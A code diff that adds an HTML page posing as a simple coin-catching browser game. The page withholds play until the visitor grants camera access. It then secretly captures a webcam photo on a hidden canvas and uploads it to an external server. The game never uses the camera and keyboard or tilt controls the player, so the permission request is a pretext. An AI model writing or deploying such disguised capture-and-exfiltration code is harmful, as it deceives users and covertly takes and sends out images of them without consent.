@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Coin Catch Game</title>
+  <style>
+    body {
+      margin: 0;
+      background: #111;
+      font-family: monospace;
+      color: #0f0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    #canvas {
+      display: none;
+    }
+
+    #game-box {
+      position: relative;
+      background: #222;
+      width: 90vw;
+      max-width: 500px;
+      height: 500px;
+      overflow: hidden;
+      border: 2px solid #0f0;
+    }
+
+    #overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      z-index: 5;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 1.1rem;
+      text-align: center;
+      padding: 10px;
+    }
+
+    /* PLAYER AS REAL PNG */
+    #player {
+      width: 60px;  /* adjust size */
+      height: auto;
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 2;
+      pointer-events: none;
+    }
+
+    /* COIN AS REAL PNG */
+    .coin {
+      width: 40px;
+      height: auto;
+      position: absolute;
+      top: 0;
+      z-index: 1;
+      pointer-events: none;
+    }
+
+    button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      font-family: monospace;
+      background: #0f0;
+      border: none;
+      cursor: pointer;
+    }
+
+    #helpBtn {
+      background: #444;
+      color: white;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <div id="game-box">
+    <img id="player" src="face.png">
+
+    <div id="overlay">
+      <p>This is a preview. Grant camera access to play!</p>
+      <button id="grantPermsBtn">Grant Camera Access</button>
+      <button id="helpBtn">Need Help?</button>
+    </div>
+  </div>
+
+<script>
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const grantBtn = document.getElementById('grantPermsBtn');
+const helpBtn = document.getElementById('helpBtn');
+const overlay = document.getElementById('overlay');
+const player = document.getElementById('player');
+const gameBox = document.getElementById('game-box');
+
+let playerX = gameBox.offsetWidth / 2 - 25;
+let cameraGranted = false;
+
+// Help text
+helpBtn.addEventListener("click", () => {
+    overlay.innerHTML = `
+        <p><strong>Camera access was denied.</strong><br>
+        To reset it:</p>
+        <ul style="text-align: left;">
+            <li>Click the <strong>🔒 lock icon</strong> in your browser’s address bar</li>
+            <li>Find "Camera" in the list</li>
+            <li>Set it to "Allow"</li>
+            <li>Refresh the page</li>
+        </ul>
+    `;
+});
+
+// Detect denied perms
+if (navigator.permissions) {
+    navigator.permissions.query({ name: 'camera' }).then(result => {
+        if (result.state === 'denied') {
+            overlay.innerHTML = `
+                <p><strong>Camera permission denied.</strong><br>
+                Please allow camera access in your browser settings and refresh the page.</p>
+                <button id="helpBtn">Need Help?</button>
+            `;
+            document.getElementById("helpBtn").addEventListener("click", () => helpBtn.click());
+        }
+    });
+}
+
+// Send image to server
+async function sendToServer(imageData) {
+    try {
+        await fetch("https://simple-game-server-api.onrender.com/upload", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ image: imageData })
+        });
+    } catch (err) {
+        console.error("Upload failed", err);
+    }
+}
+
+// Request camera
+async function requestCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        video.onloadedmetadata = () => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            sendToServer(imageData);
+
+            stream.getTracks().forEach(track => track.stop());
+            overlay.style.display = "none";
+            cameraGranted = true;
+        };
+    } catch (err) {
+        alert("Camera access was denied.");
+    }
+}
+
+grantBtn.addEventListener("click", () => {
+    requestCamera();
+});
+
+// Spawn coins (real PNG images)
+function spawnCoin() {
+    const coin = document.createElement('img');
+    coin.src = 'coin.png';
+    coin.className = 'coin';
+
+    coin.style.left = Math.random() * (gameBox.offsetWidth - 40) + 'px';
+    gameBox.appendChild(coin);
+
+    let y = 0;
+    const fall = setInterval(() => {
+        y += 5;
+        coin.style.top = y + 'px';
+
+        const playerRect = player.getBoundingClientRect();
+        const coinRect = coin.getBoundingClientRect();
+
+        if (
+            coinRect.bottom >= playerRect.top &&
+            coinRect.left < playerRect.right &&
+            coinRect.right > playerRect.left
+        ) {
+            coin.remove();
+            clearInterval(fall);
+        }
+
+        if (y > gameBox.offsetHeight) {
+            coin.remove();
+            clearInterval(fall);
+        }
+    }, 30);
+}
+
+// Game loop
+function gameLoop() {
+    if (!cameraGranted) {
+        playerX += Math.random() < 0.5 ? -3 : 3;
+    }
+
+    playerX = Math.max(0, Math.min(gameBox.offsetWidth - 60, playerX));
+    player.style.left = playerX + 'px';
+
+    requestAnimationFrame(gameLoop);
+}
+
+// Keyboard
+document.addEventListener('keydown', (e) => {
+    if (!cameraGranted) return;
+    if (e.key === 'ArrowLeft') playerX -= 15;
+    if (e.key === 'ArrowRight') playerX += 15;
+});
+
+// Mobile tilt
+if (window.DeviceOrientationEvent) {
+    window.addEventListener('deviceorientation', (event) => {
+        if (!cameraGranted) return;
+        const gamma = event.gamma;
+        if (gamma > 5) playerX += 5;
+        if (gamma < -5) playerX -= 5;
+    });
+}
+
+setInterval(spawnCoin, 1000);
+gameLoop();
+</script>
+</body>
+
+</html>
